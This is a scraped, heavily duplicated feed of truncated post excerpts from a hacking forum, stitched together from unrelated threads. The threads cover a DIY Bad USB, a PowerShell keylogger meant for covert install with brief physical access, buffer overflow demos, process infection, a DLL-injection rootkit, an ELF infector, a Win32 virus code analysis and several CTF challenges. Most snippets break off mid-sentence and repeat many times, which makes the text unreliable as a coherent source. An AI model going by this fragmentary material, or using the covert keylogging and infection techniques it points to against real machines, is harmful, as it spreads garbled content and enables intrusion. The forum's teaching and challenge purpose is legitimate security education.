Win - DIY Bad USB [Part 3/3]: You may have read the awesome \u201cPlug In To Win\u201d series from @TheDoctor. It make me recall some experiments I did time ago on HID injection. After some private chat, we agreed to release this extra post to present one more HW alt&hellip;", "Continuing the discussion from Plug In To Win - DIY Bad USB [Part 3/3]: You may have read the awesome \u201cPlug In To Win\u201d series from @TheDoctor. It make me recall some experiments I did time ago on HID injection. After some private chat, we agreed to release this extra post to present one more HW alt&hellip;", "This is kind of awesome! But one question is there: Is the DIY one faster or the Ducky? I\u2019m also hope @0x00pf article will be there in some time", "Hey Mates! This time I\u2019ll tell you how you can build your own Bad USB for about 10$. It\u2019s pretty easy, but requires a compatible USB Stick. RequirementsYou\u2019ll need an USB Stick with the Phison 2303 (2251-03) microcontroller installed. Sadly you can\u2019t just ask in your favourite hardware shop for &hellip;", "This is kind of awesome! But one question is there: Is the DIY one faster or the Ducky? I\u2019m also hope @0x00pf article will be there in some time", "Hey Mates! This time I\u2019ll tell you how you can build your own Bad USB for about 10$. It\u2019s pretty easy, but requires a compatible USB Stick. RequirementsYou\u2019ll need an USB Stick with the Phison 2303 (2251-03) microcontroller installed. Sadly you can\u2019t just ask in your favourite hardware shop for &hellip;", "The PowerSploit script used around 20(!)% CPU power and had many mistakes, like keys were saved more than one time, etc\u2026 I used this one as base, which was much better. After my modifications it just used 0-0.3% CPU power, which is pretty good - in my oppinion . [image]", "Hey Mates! As promised I share a Powershell Keylogger with you, which can be used together with our Bad USB to be installed within just some seconds of physical access . This keylogger is not completly written by me! I used several ones on the internet and modified them to fit my needs . The origi&hellip;", "Really awesome tutorial. A real must have for any aspiring programmer/hacker. I am a fan of how you\u2019ve linked it all together, a lot of content is just C, or just ASM or just memory, but they all link, and I think you did a really good job of linking it all together.", "Hey Mates! This time I have a project of mine to share with you about the USB Rubber Ducky. Maybe some of you already heard of it, e.g. @Occupytheweb wrote an article about its use in Mr. Robot. At the end of this small series you should be able to write your own Scripts for hacking the box just w&hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "Excellent tutorial! @0x00pf Can\u2019t wait for part II!", "Excellent tutorial! @0x00pf Can\u2019t wait for part II!", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "It\u2019s arch-dependent. For instance, PA-RISC stack grows upwards\u2026 Never worked with one though. Thinking about it as a physical stack may be confusing. Better consider it as a LIFO (Last In First out) collection. Then it doen\u2019t matter in which direction it grows\u2026 the important thing is that the last &hellip;", "@dtm pointed it out. Apparently, gcc sorts local variables in the stack according to its type and not the declaration order. Looks like int goes first and actually the arrays goes last. It does not matter where do you put the int, it will always will go first, at least, right now with gcc.", "It\u2019s arch-dependent. For instance, PA-RISC stack grows upwards\u2026 Never worked with one though. Thinking about it as a physical stack may be confusing. Better consider it as a LIFO (Last In First out) collection. Then it doen\u2019t matter in which direction it grows\u2026 the important thing is that the last &hellip;", "@oaktree, IMO, the best way to find it out is through the legend GDB itself. Here\u2019s a sample of ASM code if you want to play around with it. Nothing crazy, pretty self-explanatory, but it will help you visualise the whole upwards/downwards trick: global _startsection .text_start:mov eax, 0&hellip;", "It\u2019s arch-dependent. For instance, PA-RISC stack grows upwards\u2026 Never worked with one though. Thinking about it as a physical stack may be confusing. Better consider it as a LIFO (Last In First out) collection. Then it doen\u2019t matter in which direction it grows\u2026 the important thing is that the last &hellip;", "@oaktree yes, padding is indeed applied but in this case it\u2019s more important which variable gets stored below/above the another. If the buffer gets stored below the \u201ckey\u201d variable, then it can indeed overflow and affect key\u2019s value, otherwise the affected variables would be instruction pointers, fra&hellip;", "Sure, compiler optimization plays a big role but I\u2019ve messed with these kind of buffer overflows and I was unable to change the value of a certain variable unless the buffer was declared in a specific way/order. Just an fyi to those who aren\u2019t getting the expected result.", "@dtm pointed it out. Apparently, gcc sorts local variables in the stack according to its type and not the declaration order. Looks like int goes first and actually the arrays goes last. It does not matter where do you put the int, it will always will go first, at least, right now with gcc.", "@dtm pointed it out. Apparently, gcc sorts local variables in the stack according to its type and not the declaration order. Looks like int goes first and actually the arrays goes last. It does not matter where do you put the int, it will always will go first, at least, right now with gcc.", "This is a buffer overflow vulnerability but not the one that can modify the state of a variable. Get a pen and draw the stack on a paper. The declaration of the variables in the source code says it all.", "I\u2019m not sure if there\u2019s a guaranteed way of knowing how the stack will turn out since that entirely depends on the compiler and what it believes is the most optimal solution. But yes, most, if not all, of my encounters were the other way around.", "@Valentine yes, google \u201cInline Assembly\u201d for further info.", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "Ah, @0x00pf and @_py: that\u2019s sort of what I meant. EDIT: @_py that was a wonderful article you linked. Anyone reading through this discourse should definitely spend time reading that tutorial as a supplement or to entertain curiosity.", "@oaktree It\u2019s to make CPU\u2019s life easier while reading the values and it also has to do with the arch you are working on. Google \u201cmemory alignment in C\u201d or something close to that and check out this interesting paper http://www.catb.org/esr/structure-packing/.", "Ah, @0x00pf and @_py: that\u2019s sort of what I meant. EDIT: @_py that was a wonderful article you linked. Anyone reading through this discourse should definitely spend time reading that tutorial as a supplement or to entertain curiosity.", "Nop\u2026 but quite close. We will come to it later", "Just a guess, but is it because of memory pagination?", "Just a guess, but is it because of memory pagination?", "Great post @0x00pf. Really resourceful for the newcomers.", ":)\u2026 that is what I meant\u2026 actually some microcontroller have a few bytes of RAM\u2026 but that is indeed a mistake. Thanks for pointing it out. I\u2019ll fix it", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "Great post @0x00pf. Really resourceful for the newcomers.", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "I\u2019ve been trying to learn ASM on my own but it\u2019s hard to learn for a noob. C is a bit easier to understand and learn but at the same time it\u2019s still hard. I am glad that someone is starting to teach the beginners. Cheers.", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", ":)\u2026 that is what I meant\u2026 actually some microcontroller have a few bytes of RAM\u2026 but that is indeed a mistake. Thanks for pointing it out. I\u2019ll fix it", "Perhaps you meant 64 K Bytes??", ":)\u2026 that is what I meant\u2026 actually some microcontroller have a few bytes of RAM\u2026 but that is indeed a mistake. Thanks for pointing it out. I\u2019ll fix it", "Perhaps you meant 64 K Bytes??", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "Thanks\u2026 Glad to hear you like it", "Ahh, finally: tutorials aimed to the beginner. Excellent work @0x00pf. -Phoenix750", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "You wouldn\u2019t like a post from me on how the Linux command-line works  Thanks for sharing your thoughts", "Good example. You will probably have to compile with something like this, to actually test the program. gcc -Wall -o bdemo buffer_overflow_demo.c -fno-stack-protector", "Good example. You will probably have to compile with something like this, to actually test the program. gcc -Wall -o bdemo buffer_overflow_demo.c -fno-stack-protector", "Hi 0x00\u2019ers  I was messing around with C and I decided to replicate a buffer overflow attack. What is a buffer overflow? In simple terms, a buffer overflow is when input goes past the &quot;cap&quot; that is allowed for the input to have. In more advanced terms, a buffer overflow is when the user inputs mo&hellip;", "Good example. You will probably have to compile with something like this, to actually test the program. gcc -Wall -o bdemo buffer_overflow_demo.c -fno-stack-protector", "You wouldn\u2019t like a post from me on how the Linux command-line works  Thanks for sharing your thoughts", "You wouldn\u2019t like a post from me on how the Linux command-line works  Thanks for sharing your thoughts", "Doesn\u2019t need to be you, anyone who wants to can do it! -Phoenix750", "You wouldn\u2019t like a post from me on how the Linux command-line works  Thanks for sharing your thoughts", "You wouldn\u2019t like a post from me on how the Linux command-line works  Thanks for sharing your thoughts", "@0x00pf I plan to do a short series on the introduction of offensive security which will cover passive &amp; active recon, exploitation, and maintaining access, so new people can follow. I will however not talk about more advanced topics like how the Linux command line works (not in detail atleast, I wi&hellip;", "Hey @Evalion, do you have any specific topic in mind?", "@0x00pf I plan to do a short series on the introduction of offensive security which will cover passive &amp; active recon, exploitation, and maintaining access, so new people can follow. I will however not talk about more advanced topics like how the Linux command line works (not in detail atleast, I wi&hellip;", "Hey @Evalion, do you have any specific topic in mind?", "Hey @Evalion, do you have any specific topic in mind?", "Hey @Evalion, do you have any specific topic in mind?", "Look we have a donation page, the site has been up for half a year now and we have received a total of 4 dollars in donation. A VPS costs around 100 dollars per year, and we are at the limit already (Site being slow due to low on RAM). We have no choice but to get ads.", "Congrats @_py   !.. Very neat solution!", "Congrats @_py   !.. Very neat solution!", "Congrats @_py   !.. Very neat solution!", "Here\u2019s my version: #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/ptrace.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/stat.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/user.h&gt;#include &lt;sys/reg.h&gt;#include &lt;errno.h&gt;#include &lt;elf.h&gt;#include &lt;s&hellip;", "Here\u2019s my version: #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/ptrace.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/stat.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/user.h&gt;#include &lt;sys/reg.h&gt;#include &lt;errno.h&gt;#include &lt;elf.h&gt;#include &lt;s&hellip;", "Quick suggest - use ^L for clear, so it won\u2019t show up in your hist.", "Since we\u2019ve recently covered DLLs and, in a timely manner, @0x00pf has given us a brilliant paper on infecting processes, I thought that I\u2019d contribute my piece on IAT hooking using a method called DLL injection. In this paper, I will be detailing an implementation of a simple user mode rootkit as a&hellip;", "Since we\u2019ve recently covered DLLs and, in a timely manner, @0x00pf has given us a brilliant paper on infecting processes, I thought that I\u2019d contribute my piece on IAT hooking using a method called DLL injection. In this paper, I will be detailing an implementation of a simple user mode rootkit as a&hellip;", "We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started. But, how to infect a process that is already running?. Well, this paper will introduce the basic techniques you need to learn in order to fiddle with other processe&hellip;", "Just stumbled across this: What are your thoughts on the subject\u2026?", "We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started. But, how to infect a process that is already running?. Well, this paper will introduce the basic techniques you need to learn in order to fiddle with other processe&hellip;", "We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started. But, how to infect a process that is already running?. Well, this paper will introduce the basic techniques you need to learn in order to fiddle with other processe&hellip;", "Sorry about that  It\u2019d be great to collaborate. Send me a message on the next topic. I\u2019ll do whenever I get another idea", "Dude! Second time where I\u2019m about to write up a paper on a certain topic and you wrote it sooner xD Either way, great explanation as always, ptrace is really powerful. Maybe we can collaborate on a similar topic in the future since our ideas seem to be alike.", "We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started. But, how to infect a process that is already running?. Well, this paper will introduce the basic techniques you need to learn in order to fiddle with other processe&hellip;", "We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started. But, how to infect a process that is already running?. Well, this paper will introduce the basic techniques you need to learn in order to fiddle with other processe&hellip;", "We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started. But, how to infect a process that is already running?. Well, this paper will introduce the basic techniques you need to learn in order to fiddle with other processe&hellip;", "I have a number of passwords but they don\u2019t seem to work when entered in the little prompt that pops up. Am I finished, or should I have a pass for this little prompt? EDIT: Ok, read Sergeantsploit\u2019s answer above and think I got it, thanks for the challenge @0x00pf ! Here\u2019s roughly what I did: ca&hellip;", "Hi Everybody! Inspired by @TheDoctor I started working in a small side project involving some crackme\u2019s, and I would appreciate your feedback/comments (if the binary works on your system, how easy/difficult you found the challenger,\u2026) The program is encoded at the end of this post. To get the bina&hellip;", "I have a number of passwords but they don\u2019t seem to work when entered in the little prompt that pops up. Am I finished, or should I have a pass for this little prompt? EDIT: Ok, read Sergeantsploit\u2019s answer above and think I got it, thanks for the challenge @0x00pf ! Here\u2019s roughly what I did: ca&hellip;", "Here is your weekend challenge. Let\u2019s try something different this week #The Challenge A group of Black Hats, known as the Cr4king GuYs are doing very bad things in the Internet, so your team have decided to stop them. Your colleagues have hacked into one of their computers and they\u2019ve found a hid&hellip;", "A while back we used to have a repo on Github, the Community-Code repo; and because there wasn\u2019t much traction on it we decided to delete it. Since then we\u2019ve had many requests to create a GitHub repo and or a GitLab server. Due to a lack of funds we are unable to make a GitLab server, although it &hellip;", "Thank you . Just wanted to point that out, before anyone believes TOR works with such a bad 2 node system .", "Sorry, but your real IP is not the entry node! These are two completly different things. The entry node is the first node you connect to. So your real IP can only be seen when the entry node (Again, that\u2019s not you!) and the exit node work together. The second node is not required to examine your IP.&hellip;", "Hi fellas, During my daily technology watch, I found a pretty interesting article about advanced usage of bash. I guess that it will interest you guys ! http://samrowe.com/wordpress/advancing-in-the-bash-shell/ Hope it helps ! Best, Nitrax", "Brilliant post @_py I see some serious heavy wizardry in this post.", "I appreciate the feedback @0x00pf! I hope my explanation didn\u2019t confuse you.", "Brilliant post @_py I see some serious heavy wizardry in this post.", "I appreciate the feedback @0x00pf! I hope my explanation didn\u2019t confuse you.", "Brilliant post @_py I see some serious heavy wizardry in this post.", "UPDATE: Please refer to Linux Internals - The Art Of Symbol Resolution for a more detailed and updated analysis of the concept. Hey peeps! I hope you\u2019re all doing great. It\u2019s been a long time since my last post. Anyway, today I present to you something completely different from what you\u2019ve been use&hellip;", "Right, I forgot the other half: though oftentimes better than master of one. I can\u2019t confirm your masteries, I\u2019d assume you have a few.", "@dtm, I want to believe that you were too tired while typing that comment.", "Right, I forgot the other half: though oftentimes better than master of one. I can\u2019t confirm your masteries, I\u2019d assume you have a few.", "Good job perl -e \u2018print &quot;t&quot;x 0x10\u2019 &gt; keyfile.dat", "Not sure how to interpret that sentence\u2026 I\u2019d say thanks\u2026 just in case", "Good job perl -e \u2018print &quot;t&quot;x 0x10\u2019 &gt; keyfile.dat", "Not sure how to interpret that sentence\u2026 I\u2019d say thanks\u2026 just in case", "Not sure how to interpret that sentence\u2026 I\u2019d say thanks\u2026 just in case", "Not sure how to interpret that sentence\u2026 I\u2019d say thanks\u2026 just in case", "Not sure how to interpret that sentence\u2026 I\u2019d say thanks\u2026 just in case", "Not sure how to interpret that sentence\u2026 I\u2019d say thanks\u2026 just in case", "Good job perl -e \u2018print &quot;t&quot;x 0x10\u2019 &gt; keyfile.dat", "Well done pico, jack of all trades, master of none!", "Good job perl -e \u2018print &quot;t&quot;x 0x10\u2019 &gt; keyfile.dat", "Hello 0x00sec! This is the fifth installment of my Dynamic Memory series. In my last article, I went through using brk and sbrk to alter a process\u2019s program break. After a decent amount of studying, I have some code to show all of you. I set out to roughly implement malloc and free and I have done&hellip;", "Disclaimer: The synchronisation code is broken since it was written when I had very little knowledge of how it worked. Following from my previous paper, Windows Keylogging - Part I, I will be showcasing and explaining an example implementation of a Windows keylogger named Coeus, after the titan Coe&hellip;", "Continuing the discussion from Understanding a Win32 Virus: Background Material: Code AnalysisLet\u2019s begin with the first section of the code. [BITS 32]    ; defines 32-bit%include &quot;win32n.inc&quot;virStart:        pushad        call CodeStartCodeStart:        pop ebp        sub ebp,CodeStartT&hellip;", "Good job perl -e \u2018print &quot;t&quot;x 0x10\u2019 &gt; keyfile.dat", "Welcome to my first challenge! If you\u2019re interested in becoming a reverse engineer, it\u2019s important that you have a strong background with low level data and can understand the process of disassembly and debugging. Details of the ChallengeA friend of yours is an arts major but he hasn\u2019t been making&hellip;", "Great post mate\u2026 I almost missed the last part. Just realized you updated it but chance. Congrats!", "Hello 0x00sec! This is the fifth installment of my Dynamic Memory series. In my last article, I went through using brk and sbrk to alter a process\u2019s program break. After a decent amount of studying, I have some code to show all of you. I set out to roughly implement malloc and free and I have done&hellip;", "That sounds great! I\u2019m looking forward to it!", "That sounds great! I\u2019m looking forward to it!", "Thanks @0x00pf! Next, I\u2019ll be walking through a rough implementation of malloc.", "Thanks @0x00pf! Next, I\u2019ll be walking through a rough implementation of malloc.", "Congrat @oaktree. Good stuff. That\u2019s ASLR in action. Try to disable it to get it fixed. I think you should keep sharing your findings. Knowing how this works\u2026 specially the insides of malloc/free data structures are basic to understand things like heap overflows.", "Congrat @oaktree. Good stuff. That\u2019s ASLR in action. Try to disable it to get it fixed. I think you should keep sharing your findings. Knowing how this works\u2026 specially the insides of malloc/free data structures are basic to understand things like heap overflows.", "Hi everyone! It\u2019s been a while since Part 3, but rest assured that the wait has been worth it! (I hope) This paper will cover the Linux versions of two system calls that are paramount in memory management. The same system calls, possibly different in implementation, exist on *BSD and its derivative&hellip;", "Welcome to this new series intended to explain the guts of all those hacker\u2019s tools out there you use or want to use\u2026 Basically, we are going to explain you how does they work and how do you can build your own\u2026 Keep reading if you do not want to be a Skid ;). We will start the series with Proxychai&hellip;", "What video???", "Sure. I\u2019m looking forward to the complete analysis of the virus.  Update: Sorry about the lapsus.", "Thanks. If you\u2019re still interested, I\u2019m not finished yet. Just publishing the additions in case I accidentally lose them again.", "Thanks. If you\u2019re still interested, I\u2019m not finished yet. Just publishing the additions in case I accidentally lose them again.", "Great post mate\u2026 I almost missed the last part. Just realized you updated it but chance. Congrats!", "check @sergeantsploit comment above for the details", "Continuing this:Can anybody find the hidden image and what search engine I found it from in this? http://termbin.com/78ku", "Woah this is really decent! I have learned soo much in this. Thank you Pico and @sergeantsploit", "Here is your weekend challenge. Let\u2019s try something different this week #The Challenge A group of Black Hats, known as the Cr4king GuYs are doing very bad things in the Internet, so your team have decided to stop them. Your colleagues have hacked into one of their computers and they\u2019ve found a hid&hellip;", "In my previous article, A Simple Demonstration on Malware Analysis, we dissected an infected program to locate and extract the file infector. To follow up from before, I said that we will be reversing the infector to find out what mechanisms have been included to allow it to perform its task, but in&hellip;", "Try running file against your file", "Here is your weekend challenge. Let\u2019s try something different this week #The Challenge A group of Black Hats, known as the Cr4king GuYs are doing very bad things in the Internet, so your team have decided to stop them. Your colleagues have hacked into one of their computers and they\u2019ve found a hid&hellip;", "I\u2019m using base64 -d to decode the image, but running strings only reveals \u201cdisk_dump.img\u201d\u2026", "@sergeantsploit Well done  and great write up! Alternative way to get the passwords: In this simple case you can just run strings in the image to get the passwords @Evalion This is how the image was generated: $ dd if=/dev/zero of=disk_dump.img bs=1K count=100$ mkfs.vfat disk_dump.img$ mkdi&hellip;", "SOLVED: I guess I wasted alot of time not following instructions. Ok, so looking at the hash string just gives it away. H4sICOudyVcAA2Rpc2tfZHVtcC5pbWcA7dxfaFZlGADw120YfEtNKClvfJOyDPxqNvoj/dlfx0DXcMs0S/r27Wx+be3bvvNNZ4hNuioSUrvsRqULLUMo6EITvYiKGOVlYNFFWjkIoQiRap2VkV1H7aLfj3Pe5/A+z/tweM+5fqcfevW5&hellip;", "Telling us how to generate the file would be a huge help to me. It would enable me to explore the method used so I can understand the gibberish better. And I\u2019d assume that in the scenario you described I would know how said file was generated  Then again, forensics aren\u2019t my art. -Phoenix750", "Telling us how to generate the file would be a huge help to me. It would enable me to explore the method used so I can understand the gibberish better. And I\u2019d assume that in the scenario you described I would know how said file was generated  Then again, forensics aren\u2019t my art. -Phoenix750", "In our walk in linux, there comes a point where we need to hack ( pentest ) in a safe environment. The first thing we usually do is install Virtualization Softwares and install all the distros our system can take. In stages of hacking, to compromise the victim machine, we need some sort of program t&hellip;", "Don\u2019t mind me. Just having a bad day from sunset. I tried with linux and the mount command was just trying to make my life miserable. So i switched to windows. I can send the errors if you want", "It was a word of warning, just in case. I do not want anybody to destroy their own data. Are you using windows to solve the challenge?. It should be possible to mount the file on windows but I cannot give much support on that. Otherwise, please post/PM the errors to get an idea of what may be the p&hellip;", "I checked with an explorer on windows. It stated the number of files is 1. And that is what it is giving me. I have tried the mount command: I am having alot of errors. I have tried various commands.", "@sergeantsploit be careful, that partition table looks like your hard drive. I think you know too much for this challenge. As I said it is very easy to solve, you do not need to do anything very sophisticated. I will add another hint that I hope will make things easier", "It is not a real partition. It is very small and is almost empty so it can be compressed a lot. If somebody is interested I can write a couple of lines on how to generate the file\u2026 in case nobody mentions this in the comments.", "Here is your weekend challenge. Let\u2019s try something different this week #The Challenge A group of Black Hats, known as the Cr4king GuYs are doing very bad things in the Internet, so your team have decided to stop them. Your colleagues have hacked into one of their computers and they\u2019ve found a hid&hellip;", "Here\u2019s a Cheat Sheet for the \u201cinterface\u201d used at 0x00sec - Markdown", "Nice article although you should embed the code using the supplied support. As well as upload the code somewhere. Good job nonetheless!", "In our walk in linux, there comes a point where we need to hack ( pentest ) in a safe environment. The first thing we usually do is install Virtualization Softwares and install all the distros our system can take. In stages of hacking, to compromise the victim machine, we need some sort of program t&hellip;", "Well, what about starting a wifi hotspot on your PC? P.S.: If your device is rooted (and your using Windows ), this application may work http://forum.xda-developers.com/showthread.php?t=1371345", "Let\u2019s put away the serious stuff for a while and let\u2019s have some fun. What about some hacking pranks!. Let\u2019s start with something simple, the so called nervous mouse. Note: The code is a modification of some example from internet. I cannot recall where I got it, but it is, let\u2019s say, the default ex&hellip;", "As it doesn\u2019t look that @dtm is going to cover linux stuff, I have wrote a quick and dirty version of the great PE File Infector paper from @dtm but targeting ELF binaries specifically under GNU/Linux systems. The process I will describe is slightly different from the one explained in the PE counte&hellip;", "Are you trying to master the ELF format and you need some stuff to try your new skills?.. well, this is a simple challenge for you to try. The ChallengeA colleague that works as Network Engineer for an important company has captured a piece of malware that somebody was trying to use against the co&hellip;", "Continuing the discussion from CAPTCHA - Randomness applicability: When I first discovered Information Theory many years ago I was amazed. The fact of being able to quantify the amount of information in a sequence of bits just looked awesome. So I would try to explain this as simpler as I can. Ther&hellip;", "Continuing the discussion from CAPTCHA - Randomness applicability: When I first discovered Information Theory many years ago I was amazed. The fact of being able to quantify the amount of information in a sequence of bits just looked awesome. So I would try to explain this as simpler as I can. Ther&hellip;", "Congrats @L3akM3-0day  and thanks for the detailed write-up. Well done!", "@_py and @unh0lys0da, To be honest I haven\u2019t read the text on @unh0lys0da post, just looked at the code and I though it was the reply to the secondary goal: Actually, this are the two additional things you have to do to remove any warning from the readelf output (in addition to set the number of &hellip;", "@_py and @unh0lys0da, To be honest I haven\u2019t read the text on @unh0lys0da post, just looked at the code and I though it was the reply to the secondary goal: Actually, this are the two additional things you have to do to remove any warning from the readelf output (in addition to set the number of &hellip;", "Great post mate! Awesome", "Congrats @_py ! Hope you enjoyed\u2026 but according to your write up it looks like it was too easy\u2026 Answering your question. Stripping the sections is not really malicious, however, it can be done in a way readelf does not complain and then it is not so-obvious what is going on. Check this example (n&hellip;", "Are you trying to master the ELF format and you need some stuff to try your new skills?.. well, this is a simple challenge for you to try. The ChallengeA colleague that works as Network Engineer for an important company has captured a piece of malware that somebody was trying to use against the co&hellip;", "Good job. I did exactly the same", "Good job. I did exactly the same", "Alright here are the two programs i used to fix it: #include &lt;linux/elf.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;int get_file_size( int fd ){    struct stat _info;    fstat( fd, &amp;_info );    return _info.st_size;}int main(int argc, char *argv[]){    struct elf64_&hellip;", "Congrats @_py ! Hope you enjoyed\u2026 but according to your write up it looks like it was too easy\u2026 Answering your question. Stripping the sections is not really malicious, however, it can be done in a way readelf does not complain and then it is not so-obvious what is going on. Check this example (n&hellip;", "Are you trying to master the ELF format and you need some stuff to try your new skills?.. well, this is a simple challenge for you to try. The ChallengeA colleague that works as Network Engineer for an important company has captured a piece of malware that somebody was trying to use against the co&hellip;", "@_py sorry about the confusion. Malware use to do things like that to avoid analysis. That is what I mentioned. The challenge writing really needs some improvement  To get some assembly out of the binary you can try radare2", "@0x00pf, indeed I could not load the program or dump the object code and that was actually my first thought of solving it but gdb was refusing to load the program. I actually tried using a breakpoint at the entry point address which was shown in the readelf output but I didn\u2019t have any luck at all.&hellip;", "I don\u2019t think it was meant to be malicious, probably just a method to obfuscate information to deter the reverse engineer\u2019s attempts. EDIT: Forgot to click \u201cReply\u201d before pico\u2019s. Also, here\u2019s a quick reverse engineer of the disassembly of the main function, so it might be a bit inaccurate: size_t&hellip;", "Great post mate! Awesome", "What\u2019s good, peeps? Initially, I was going to do a write up on an approach to programming an executable file infector (AKA a virus) however, I thought that it would be more interesting if we reversed and analyzed one. Throughout my journey with malware, I\u2019ve never been quite able to grasp the mechan&hellip;", "Are you trying to master the ELF format and you need some stuff to try your new skills?.. well, this is a simple challenge for you to try. The ChallengeA colleague that works as Network Engineer for an important company has captured a piece of malware that somebody was trying to use against the co&hellip;", "Congrats @L3akM3-0day  and thanks for the detailed write-up. Well done!", "Congrats @_py ! Hope you enjoyed\u2026 but according to your write up it looks like it was too easy\u2026 Answering your question. Stripping the sections is not really malicious, however, it can be done in a way readelf does not complain and then it is not so-obvious what is going on. Check this example (n&hellip;", "@0x00pf, indeed I could not load the program or dump the object code and that was actually my first thought of solving it but gdb was refusing to load the program. I actually tried using a breakpoint at the entry point address which was shown in the readelf output but I didn\u2019t have any luck at all.&hellip;", "Congrats @_py ! Hope you enjoyed\u2026 but according to your write up it looks like it was too easy\u2026 Answering your question. Stripping the sections is not really malicious, however, it can be done in a way readelf does not complain and then it is not so-obvious what is going on. Check this example (n&hellip;", "[spoiler]By readelf-ing the binary it\u2019s quite obvious that there is something wrong with the number of the section headers. They just can\u2019t be 0.  [image]So the next step was to patch the binary so that the ELF header field would be correct. The ELF 64-bit header looks like this: typedef struct &hellip;", "Wow, after an insane amount of research and coming back to this post I can finally make sense out of it. Brilliant post @0x00pf!", "Congrats @L3akM3-0day  and thanks for the detailed write-up. Well done!", "Are you trying to master the ELF format and you need some stuff to try your new skills?.. well, this is a simple challenge for you to try. The ChallengeA colleague that works as Network Engineer for an important company has captured a piece of malware that somebody was trying to use against the co&hellip;", "Wow, after an insane amount of research and coming back to this post I can finally make sense out of it. Brilliant post @0x00pf!", "[spoiler]By readelf-ing the binary it\u2019s quite obvious that there is something wrong with the number of the section headers. They just can\u2019t be 0.  [image]So the next step was to patch the binary so that the ELF header field would be correct. The ELF 64-bit header looks like this: typedef struct &hellip;", "Are you trying to master the ELF format and you need some stuff to try your new skills?.. well, this is a simple challenge for you to try. The ChallengeA colleague that works as Network Engineer for an important company has captured a piece of malware that somebody was trying to use against the co&hellip;", "Congrats @L3akM3-0day  and thanks for the detailed write-up. Well done!", "Congrats @L3akM3-0day  and thanks for the detailed write-up. Well done!", "Here is how I solve the Challenge First Goal : Fix it Here is how I did to solve the first part To Solve the challenge here is what I\u2019ve done Decode the string to have the binary fileFirst thing we need to do is decode the string provided. I copied the string in a file then ran : cat challeng&hellip;", "Are you trying to master the ELF format and you need some stuff to try your new skills?.. well, this is a simple challenge for you to try. The ChallengeA colleague that works as Network Engineer for an important company has captured a piece of malware that somebody was trying to use against the co&hellip;", "I\u2019m about as far as making it into a legit binary.", "Are you trying to master the ELF format and you need some stuff to try your new skills?.. well, this is a simple challenge for you to try. The ChallengeA colleague that works as Network Engineer for an important company has captured a piece of malware that somebody was trying to use against the co&hellip;", "Are you trying to master the ELF format and you need some stuff to try your new skills?.. well, this is a simple challenge for you to try. The ChallengeA colleague that works as Network Engineer for an important company has captured a piece of malware that somebody was trying to use against the co&hellip;", "Are you trying to master the ELF format and you need some stuff to try your new skills?.. well, this is a simple challenge for you to try. The ChallengeA colleague that works as Network Engineer for an important company has captured a piece of malware that somebody was trying to use against the co&hellip;", "You did it!. Very nice solution!", "Great post as usual mate!", "I think it is. If you look at it from the point of view of the Theory of Chaos. At the end the world is dynamic and non-linear despite of our efforts to linearise everything. We do that because we do not know yet how to deal with reality  Look at the logistic map ( https://en.wikipedia.org/wiki/Lo&hellip;", "Yes, I should check for NULL. Note that this was demo code, so error checking was omitted to avoid any sort of confusion. You surely would do as you have displayed. Thanks @0x00pf!", "Yes, I should check for NULL. Note that this was demo code, so error checking was omitted to avoid any sort of confusion. You surely would do as you have displayed. Thanks @0x00pf!", "Nice post @oaktree! Just a heads up from the realloc manpage The realloc() function returns a pointer to the newly allocated memory, which is suitably aligned for any kind of variable and may be different from ptr, or NULL if the request fails. realloc 